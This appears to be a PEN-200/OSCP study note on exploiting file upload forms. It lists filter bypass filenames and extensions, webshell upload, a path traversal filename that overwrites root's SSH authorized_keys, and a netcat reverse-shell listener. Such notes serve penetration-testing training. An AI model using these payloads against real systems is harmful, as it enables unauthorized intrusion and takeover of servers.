# File Upload Vulnerabilities / Bypass

> **PEN-200 Chapter 9.** Do not treat upload testing as only an extension-bypass problem. First determine where the file lands, whether it can execute, whether the filename/path is attacker-controlled, and what account the application runs as.

## Three useful attack categories

```text
1. Executable upload
   → upload server-side code → access it → command execution

2. Upload + another vulnerability
   → e.g. Directory Traversal in filename → overwrite sensitive file

3. User-interaction payload
   → e.g. malicious document; requires a victim to open it
```

For OSCP standalone boxes, focus heavily on the first two.

## Enumeration workflow

```text
Find upload form
  ↓
upload harmless test.txt
  ↓
locate uploaded file / response path
  ↓
inspect POST request in Burp
  ↓
identify filename + Content-Type + destination behavior
  ↓
test executable payload / filter bypass / path traversal
```

Also upload the **same filename twice**. A "file already exists" response may reveal existing filenames; errors may leak framework/language details.

## Common filter bypasses

```text
# 1. MIME / Content-Type
Change Content-Type to image/jpeg

# 2. Magic bytes
Prepend GIF89a (when content validation is weak)

# 3. Double extension
shell.php.jpg
shell.php%00.jpg

# 4. Case
shell.pHp
shell.pHP
shell.PHP

# 5. Alternative PHP extensions
.php3 .php4 .php5 .php7 .phps .phtml .phar .shtml

# 6. Null byte (legacy behavior)
shell.php%00.gif
```

PEN-200 specifically demonstrates bypassing a lowercase extension blacklist with `.pHP`, and notes less-common extensions such as `.phps` / `.php7`.

If the application allows renaming after upload, another option is:

```text
upload shell.txt → rename to shell.php
```

## Use the matching Kali webshell

```bash
ls -la /usr/share/webshells/
```

Common directories include:

```text
asp  aspx  cfm  jsp  perl  php  laudanum
```

Workflow:

```text
identify server-side language
  ↓
select matching webshell
  ↓
bypass upload filter
  ↓
find uploaded URL
  ↓
execute command
  ↓
reverse shell
```

Example PHP webshell location:

```bash
/usr/share/webshells/php/simple-backdoor.php
```

## Non-executable upload + Directory Traversal

A file does **not** need to be executable if you can control its destination path. In Burp, test traversal inside the multipart `filename=` value:

```text
filename="../../../../../../../test.txt"
```

If that appears to work, a high-impact Linux target is an SSH `authorized_keys` file.

### Overwrite `authorized_keys`

Create a keypair you control:

```bash
ssh-keygen
# Save private key as e.g. fileup
cat fileup.pub > authorized_keys
```

Modify the upload filename in Burp:

```text
../../../../../../../root/.ssh/authorized_keys
```

Then try:

```bash
ssh -i fileup root@<TARGET>
# If needed:
ssh -p <PORT> -i fileup root@<TARGET>
```

This only works if the web application's process has permission to write there. Web applications are often low-privilege (`www-data`, IIS app-pool identity), but misconfigured applications may run as root/Administrator.

> On a real production assessment, blindly overwriting files can cause data loss or downtime. Confirm scope and risk before destructive writes.

## Reverse-shell notes

Once a webshell executes commands:

```bash
nc -nvlp 4444
```

On Windows, PEN-200 demonstrates sending a Base64-encoded PowerShell reverse shell through an uploaded PHP webshell. Encoding is useful when the command contains many special characters.

Related: [[Directory Traversal]] · [[LFI-Local File Inclusion|LFI]] · [[Command Injection]]
